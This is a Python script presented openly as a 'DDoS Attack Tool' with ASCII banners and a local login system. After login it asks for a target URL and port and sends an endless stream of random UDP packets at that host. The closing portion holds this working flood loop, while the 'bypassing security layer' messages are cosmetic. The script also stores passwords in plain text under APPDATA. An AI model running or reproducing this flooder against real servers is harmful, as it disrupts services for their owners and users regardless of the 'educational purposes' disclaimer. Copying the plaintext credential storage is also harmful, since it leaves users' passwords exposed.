import os
import socket
import random
import sys
import time
import re
import platform

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def get_appdata_roaming_path_username():
    if platform.system() == "Windows":
        return os.path.join(os.getenv('APPDATA'), 'Login', 'Username')
    else:
        raise OSError("[-] This tool only works on Windows.")
    
def get_appdata_roaming_path_password():
    if platform.system() == "Windows":
        return os.path.join(os.getenv('APPDATA'), 'Login', 'Username', 'Password')
    else:
        raise OSError("[-] This tool only works on Windows.")

def generate_file_name_password():
    return os.path.join(log_directory_password, f"Password.txt")

def generate_file_name_username():
    return os.path.join(log_directory_username, f"Username.txt")

log_directory_username = get_appdata_roaming_path_username()
log_directory_password = get_appdata_roaming_path_password()

os.makedirs(log_directory_password, exist_ok=True)
os.makedirs(log_directory_username, exist_ok=True)

os.system("cls" if os.name == 'nt' else "clear")
print("\033[38;5;54m")
print('''
                ██████╗ ██████╗ ██╗     ██╗      █████╗ 
                ██╔════╝██╔═══██╗██║     ██║     ██╔══██╗
                ██║     ██║   ██║██║     ██║     ███████║
                ██║     ██║   ██║██║     ██║     ██╔══██║
                ╚██████╗╚██████╔╝███████╗███████╗██║  ██║
                ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
                    DDoS Attack Tool - Filipe Colla
''')

time.sleep(1)
print("\033[38;5;88m")
print("                               WARNING!\n")
print("This tool is for educational purposes only. Do not use it for illegal activities.")
time.sleep(3)

print("\033[0m")
print("\nAuthor: Filipe Colla")
print("Discord: Colla99")
print("Version: 1.0")
print("Github: github.com/collafilipe\n")

execute = True

while execute:
    os.system("cls" if os.name == 'nt' else "clear")
    print("\033[38;5;54m")
    print('''
                    ██████╗ ██████╗ ██╗     ██╗      █████╗ 
                    ██╔════╝██╔═══██╗██║     ██║     ██╔══██╗
                    ██║     ██║   ██║██║     ██║     ███████║
                    ██║     ██║   ██║██║     ██║     ██╔══██║
                    ╚██████╗╚██████╔╝███████╗███████╗██║  ██║
                    ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
                        DDoS Attack Tool - Filipe Colla
    ''')

    print("\033[38;5;88m")
    print("                               WARNING!\n")
    print("This tool is for educational purposes only. Do not use it for illegal activities.")

    print("\033[0m")
    print("\nAuthor: Filipe Colla")
    print("Discord: Colla99")
    print("Version: 1.0")
    print("Github: github.com/collafilipe\n")

    print("                       Welcome to COLLA DDOS ATTACK TOOL\n")
    print("[+] Enter options:\n\n1- Login to your account\n2- Register a new account\n3- Exit\n")
    option = input("[+] Option: ").strip()

    if option == "1":
        os.system("cls" if os.name == 'nt' else "clear")
        print("\033[38;5;54m")
        print('''
                    ██████╗ ██████╗ ██╗     ██╗      █████╗ 
                    ██╔════╝██╔═══██╗██║     ██║     ██╔══██╗
                    ██║     ██║   ██║██║     ██║     ███████║
                    ██║     ██║   ██║██║     ██║     ██╔══██║
                    ╚██████╗╚██████╔╝███████╗███████╗██║  ██║
                    ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
                        DDoS Attack Tool - Filipe Colla
        ''')
        print("\033[0m")
        print("Login System\n")
        username = input("Username: ")
        senha = input("Senha: ")

        try:

            for log_file in os.listdir(log_directory_username):
                log_path_username = os.path.join(log_directory_username, log_file)

                if os.path.isfile(log_path_username):
                    with open(log_path_username, 'r') as file:
                        username_txt = file.read()

                        if username_txt == username:
                            for log_file in os.listdir(log_directory_password):
                                log_path_password = os.path.join(log_directory_password, log_file)

                                if os.path.isfile(log_path_password):
                                    with open(log_path_password, 'r') as file:
                                        password_txt = file.read()

                                        if password_txt == senha:
                                            print("\033[92m")
                                            print("[+] Login successful.")
                                            execute = False
                                            time.sleep(2)
                                            break

                                        else:
                                            print("\033[38;5;88m")
                                            print("\n[-] Login failed. Please try again.")
                                            time.sleep(2)
                                            os.system("cls" if os.name == 'nt' else "clear")
                            break
                        else:
                            print("\033[38;5;88m")
                            print("[-] Login failed. Please try again.")
                            time.sleep(2)
                            os.system("cls" if os.name == 'nt' else "clear")
            else:
                print("\033[38;5;88m")
                print("[-] Login failed. Please try again.")
                time.sleep(2)
                os.system("cls" if os.name == 'nt' else "clear")

        except Exception as exception:
            print("\033[38;5;88m")
            print(f"[-] Error: {exception}")
            time.sleep(2)
            os.system("cls" if os.name == 'nt' else "clear")

    elif option == "2":
        os.system("cls" if os.name == 'nt' else "clear")
        print("\033[38;5;54m")
        print('''
                    ██████╗ ██████╗ ██╗     ██╗      █████╗ 
                    ██╔════╝██╔═══██╗██║     ██║     ██╔══██╗
                    ██║     ██║   ██║██║     ██║     ███████║
                    ██║     ██║   ██║██║     ██║     ██╔══██║
                    ╚██████╗╚██████╔╝███████╗███████╗██║  ██║
                    ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
                        DDoS Attack Tool - Filipe Colla
        ''')
        print("\033[0m")
        print("Register System\n")
        username = input("Username: ")
        senha = input("Senha: ")

        try:
            if not username or not senha:
                print("\033[38;5;88m")
                print("[-] Username or password cannot be empty.")
                time.sleep(2)
                raise ValueError("[-] Username or password cannot be empty.")
            
            for log_file in os.listdir(log_directory_username):
                log_path_username = os.path.join(log_directory_username, log_file)

                if os.path.isfile(log_path_username):
                    with open(log_path_username, 'r') as file:
                        username_txt = file.read()

                        if len(username_txt) > 0:
                            print("\033[38;5;88m")
                            raise ValueError("\n[-] Account already exists.")
                        
            with open(generate_file_name_username(), 'w') as file:
                file.write(username)

            with open(generate_file_name_password(), 'w') as file:
                file.write(senha)

            print("\033[92m")
            print("[+] Account registered successfully.")
            time.sleep(2)
            execute = False
            break

        except Exception as exception:
            print("\033[38;5;88m")
            print(f"[-] Error: {exception}")
            time.sleep(1)
            os.system("cls" if os.name == 'nt' else "clear")

    elif option == "3":
        os.system("cls" if os.name == 'nt' else "clear")
        print("\033[38;5;88m")
        print("[-] Exiting...")
        time.sleep(1)
        print("\033[0m")
        exit()
    
    else:
        print("\033[38;5;88m")
        print("[-] Invalid option. Please try again.")
        time.sleep(1)
        print("\033[0m")
        os.system("cls" if os.name == 'nt' else "clear")

def is_valid_ip(ip):
    ip_pattern = re.compile(
        r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}'
        r'(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    )
    return re.match(ip_pattern, ip) is not None

def is_valid_url(url):
    url_pattern = re.compile(
        r'^(?:http|https)://'
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'
        r'localhost|'
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'
        r'\[?[A-F0-9]*:[A-F0-9:]+\]?)'
        r'(?::\d+)?'
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    
    return re.match(url_pattern, url) is not None

while True:
    os.system("cls" if os.name == 'nt' else "clear")
    print("\033[38;5;54m")
    print('''
                    ██████╗ ██████╗ ██╗     ██╗      █████╗ 
                    ██╔════╝██╔═══██╗██║     ██║     ██╔══██╗
                    ██║     ██║   ██║██║     ██║     ███████║
                    ██║     ██║   ██║██║     ██║     ██╔══██║
                    ╚██████╗╚██████╔╝███████╗███████╗██║  ██║
                    ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
                        DDoS Attack Tool - Filipe Colla
    ''')
    print("\033[0m")
    print(f"Hello {username}\n")
    key = input("[+] Would you like to start the attack? (y/n): ").strip().lower()

    if key == "y":
        break
    elif key == "n":
        os.system("cls" if os.name == 'nt' else "clear")
        print("\033[38;5;88m")
        print("\n[-] Exiting...")
        time.sleep(1)
        print("\033[0m")
        exit()
    else:
        os.system("cls" if os.name == 'nt' else "clear")
        print("\033[38;5;54m")
        print('''
                ██████╗ ██████╗ ██╗     ██╗      █████╗ 
                ██╔════╝██╔═══██╗██║     ██║     ██╔══██╗
                ██║     ██║   ██║██║     ██║     ███████║
                ██║     ██║   ██║██║     ██║     ██╔══██║
                ╚██████╗╚██████╔╝███████╗███████╗██║  ██║
                ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
                    DDoS Attack Tool - Filipe Colla
        ''')
        print("\033[38;5;88m")
        print("\n[-] Invalid option. Please try again.\n")
        time.sleep(2)
        print("\033[0m")

os.system("cls" if os.name == 'nt' else "clear")

print("\033[38;5;54m")
print('''
                ██████╗ ██████╗ ██╗     ██╗      █████╗ 
                ██╔════╝██╔═══██╗██║     ██║     ██╔══██╗
                ██║     ██║   ██║██║     ██║     ███████║
                ██║     ██║   ██║██║     ██║     ██╔══██║
                ╚██████╗╚██████╔╝███████╗███████╗██║  ██║
                ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
                    DDoS Attack Tool - Filipe Colla
''')
print("\033[92m")
print('[+] Tool initiated. Please wait a moment...')
print("\033[0m")
print("[+] Loading", end='')
for _ in range(3):
    time.sleep(1)
    print(".", end='', flush=True)
time.sleep(1)

ip = input("\n\n[+] URL (exemple: http://linksite.com): ").strip()
port = int(input("[+] Port: ").strip())

try:
    if is_valid_ip(ip) or is_valid_url(ip):
        os.system("cls" if os.name == 'nt' else "clear")

        print("\033[38;5;54m")
        print('''
                ██████╗ ██████╗ ██╗     ██╗      █████╗ 
                ██╔════╝██╔═══██╗██║     ██║     ██╔══██╗
                ██║     ██║   ██║██║     ██║     ███████║
                ██║     ██║   ██║██║     ██║     ██╔══██║
                ╚██████╗╚██████╔╝███████╗███████╗██║  ██║
                ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
                    DDoS Attack Tool - Filipe Colla
        ''')
        print("\033[92m")
        print("[+] Valid IP or URL checked.")
        ip2 = ip.split("//")
        print("\033[0m")
        print("[+] Attack screen loading", end='')
        for _ in range(3):
            time.sleep(1)
            print(".", end='', flush=True)
        time.sleep(1)
        os.system("cls" if os.name == 'nt' else "clear")

        print("\033[38;5;54m")
        print('''
                ██████╗ ██████╗ ██╗     ██╗      █████╗ 
                ██╔════╝██╔═══██╗██║     ██║     ██╔══██╗
                ██║     ██║   ██║██║     ██║     ███████║
                ██║     ██║   ██║██║     ██║     ██╔══██║
                ╚██████╗╚██████╔╝███████╗███████╗██║  ██║
                ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
                    DDoS Attack Tool - Filipe Colla
        ''')

        print("\033[92m")
        print("________________________TRYING TO REACH THE SERVER_____________________________\n")
        time.sleep(1)
        print("_________________________ESTABLISHING CONNECTION_______________________________\n")
        time.sleep(0.5)
        print("_________________0100100 BYPASSING SECURITY LAYER 001010_______________________\n")
        time.sleep(2)
        print("_________________________CONNECTION ESTABLISHED________________________________")
        time.sleep(0.5)
        print("\n         DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES")
        time.sleep(1)

        os.system("cls" if os.name == 'nt' else "clear")
        print("\033[38;5;54m")
        print('''
                ██████╗ ██████╗ ██╗     ██╗      █████╗ 
                ██╔════╝██╔═══██╗██║     ██║     ██╔══██╗
                ██║     ██║   ██║██║     ██║     ███████║
                ██║     ██║   ██║██║     ██║     ██╔══██║
                ╚██████╗╚██████╔╝███████╗███████╗██║  ██║
                ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
        DDoS Attack Tool - Filipe Colla (Press Ctrl+C to stop the attack)
        ''')

        print("\033[92m")
        print("\n[+] Attacking server")
        time.sleep(1)
        print("\033[92m")

        try:
            sent = 0
            while True:
                sock.sendto(bytes, (ip2[1], port))
                sent += 1
                sys.stdout.write("\033[F\033[F\033[F")
                sys.stdout.write("\033[K\033[F\033[K\033[F\033[K")
                print("         +---------------+--------------------+-----------------+")
                print("         | Packets Sent  |        IP          |      Port       |")
                print("         +---------------+--------------------+-----------------+")
                print(f"         | {sent:<13} | {ip2[1]:<18} | {port:<15} |")
                print("         +---------------+--------------------+-----------------+")

                if port == 65534:
                    port = 1
        except KeyboardInterrupt:
            os.system("cls" if os.name == 'nt' else "clear")
            print("\033[0m")
            print("\n         [-] Ctrl+C detected. DDoS attack stopped.")
        input("\n         Press enter to exit...")
        os.system("cls" if os.name == 'nt' else "clear")
        print("\033[38;5;88m")
        print("[-] Exiting...")
        print("\033[0m")
    else:
        print("\033[38;5;88m")
        raise ValueError("[-] Invalid IP or URL")
except ValueError as exception:
    print("\033[38;5;88m")
    print(f"\n[-] ✘ {exception}")

#ASS: Colla
#Discord: Colla99